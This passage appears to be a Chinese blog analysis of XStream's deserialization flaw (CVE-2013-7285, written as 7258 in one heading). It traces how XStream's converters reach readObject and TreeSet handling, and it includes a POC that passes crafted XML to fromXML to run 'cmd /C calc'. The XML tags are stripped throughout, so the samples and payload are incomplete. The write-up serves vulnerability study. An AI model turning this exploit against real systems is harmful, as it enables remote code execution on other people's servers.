# 历史漏洞
XStream 远程代码执行漏洞 CVE-2013-7285 XStream 
          25
          xiaoming
                BeiJing
                TopSec
但是假如这两个类没有实现serializable接口，得到数据是这样的
      xiaoming
      25
        TopSec
        BeiJing
这里实现serializable接口和没有实现生成的数据是不一样的
这两个的差异是什么呢，可以在TreeUnmarshaller类的convertAnother方法处下断点
    TreeUnmarshaller 树解组程序，调用mapper和Converter把XML转化成java对象，里面的start方法开始解组，convertAnother方法把class转化成java对象。
    TreeMarshaller 树编组程序，调用mapper和Converter把java对象转化成XML，里面的start方法开始编组，convertAnother方法把java对象转化成XML
测试代码
    public static void main(String[] args) throws Exception{
        XStream xStream = new XStream();
        People people = new People("xiaoming",25,new Company("TopSec","BeiJing"));
        String xml = xStream.toXML(people);
        System.out.println(xml);
        People people1 = (People)xStream.fromXML(xml);
        System.out.println(people1);
    }
在没有实现serializable接口的时候，最后这里的converter是ReflectionConverter
这里的converter，翻译就是转换器，Xstream的思路是通过不同的converter来处理序列化数据中不同类型的数据，该Converter的原理是通过反射获取类对象并通过反射为其每个属性进行赋值，当然不同的类型会调用不同的转换器
来看看实现了serializable接口的是什么转化器
这里是一个SerializableConverter，这时候我们在我们之前在类里面重写的readObject打断点，发现可以进去
既然可以调用重写的readObject方法，那只要有对应的可控参数和链子就可以尝试反序列化了
这里还是来看看怎么调用的readObject
这里的converter是SerializableConverter，跟它的convert方法
继续跟进
跟进到SerializableConverter的unmarshal方法
跟进doUnmarshal
跟进callReadObject
这里通过反射调用了对应类的readObject方法，所以在实现serializable接口的时候会调用对应的readObject方法
# CVE-2013-7258远程代码执行漏洞
漏洞影响范围：1.4.x
        com.thoughtworks.xstream
        xstream
        1.4.5
## 漏洞复现
POC
    package XStream;
    import com.thoughtworks.xstream.XStream;
    public class Unser {
        public static void main(String[] args) {
            XStream xStream = new XStream();
            String xml = "\n" +
                    "    foo\n" +
                    "    \n" +
                    "        java.lang.Comparable\n" +
                    "        \n" +
                    "            \n" +
                    "                \n" +
                    "                    cmd\n" +
                    "                    /C\n" +
                    "                    calc\n" +
                    "                \n" +
                    "            \n" +
                    "            start\n" +
                    "        \n" +
                    "    \n" +
                    "";
            xStream.fromXML(xml);
        }
    }
## 漏洞分析
从fromXML下断点一路跟到了TreeUnmarshaller#start
跟进readClassType来获取对应节点的class
    public static Class readClassType(HierarchicalStreamReader reader, Mapper mapper) {
        String classAttribute = readClassAttribute(reader, mapper);
        Class type;
        if (classAttribute == null) {
            type = mapper.realClass(reader.getNodeName());
        } else {
            type = mapper.realClass(classAttribute);
        }
        return type;
    }
跟进readClassAttribute
    public static String readClassAttribute(HierarchicalStreamReader reader, Mapper mapper) {
        String attributeName = mapper.aliasForSystemAttribute("resolves-to");
        String classAttribute = attributeName == null ? null : reader.getAttribute(attributeName);
        if (classAttribute == null) {
            attributeName = mapper.aliasForSystemAttribute("class");
            if (attributeName != null) {
                classAttribute = reader.getAttribute(attributeName);
            }
        }
        return classAttribute;
    }
aliasForSystemAttribute方法是获取别名，这里是获取了resolves-to和class，来判断xml中有没有这两个属性，没有的话则返回空，这里返回的空
回到readClassType，进入if，通过realClass来获取当前节点的名称然后返回对应的Class对象
最后返回的是SortedSet
回到start方法，调用convertAnother方法，跟进去看看
defaultImplementationOf方法是根据mapper获取type的实现类，只是获取到了TreeSet
然后调用lookupConverterForType获取对应的的转换器（converter）
通过循环遍历调用Converter.canConvert()来匹配是否能转换出TreeSet类型，最后找到了一个TreeSetConverter进行返回
最后回到convertAnother，然后调用convert方法
    protected Object convert(Object parent, Class type, Converter converter) {
        Object result;
        if (this.parentStack.size() > 0) {
            result = this.parentStack.peek();
            if (result != null && !this.values.containsKey(result)) {
                this.values.put(result, parent);
            }
        }
        String attributeName = this.getMapper().aliasForSystemAttribute("reference");
        String reference = attributeName == null ? null : this.reader.getAttribute(attributeName);
        Object cache;
        if (reference != null) {
            cache = this.values.get(this.getReferenceKey(reference));
            if (cache == null) {
                ConversionException ex = new ConversionException("Invalid reference");
                ex.add("reference", reference);
                throw ex;
            }
            result = cache == NULL ? null : cache;
        } else {
            cache = this.getCurrentReferenceKey();
            this.parentStack.push(cache);
            result = super.convert(parent, type, converter);
            if (cache != null) {
                this.values.put(cache, result == null ? NULL : result);
            }
            this.parentStack.popSilently();
        }
        return result;
    }
这里又通过aliasForSystemAttribute来获取reference的别名，如果为空则调用getCurrentReferenceKey
this.getCurrentReferenceKey用来获取当前标签，也就是sorted-set
调用this.types.push将获取的值压入栈中，这里只是个压栈的操作，储存而已
然后跟进到super.convert
跟进unmarshal来到TreeSetConverter的unmarshal方法，在这里进行xml的解析
调用unmarshalComparator方法判断是否存在comparator，如果不存在，则返回NullComparator对象
于是这里的inFirstElement为true，三目运算符返回null
possibleResult也是创建的是一个空的TreeSet对象。而后则是一些赋值，就没必要一一去看了。来看到重点部分
    this.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);
跟进来到
    protected void populateTreeMap(HierarchicalStreamReader reader, UnmarshallingContext context, TreeMap result, Comparator comparator) {
        boolean inFirstElement = comparator == NULL_MARKER;
        if (inFirstElement) {
            comparator = null;
        }
        SortedMap sortedMap = new PresortedMap(comparator != null && JVM.hasOptimizedTreeMapPutAll() ? comparator : null);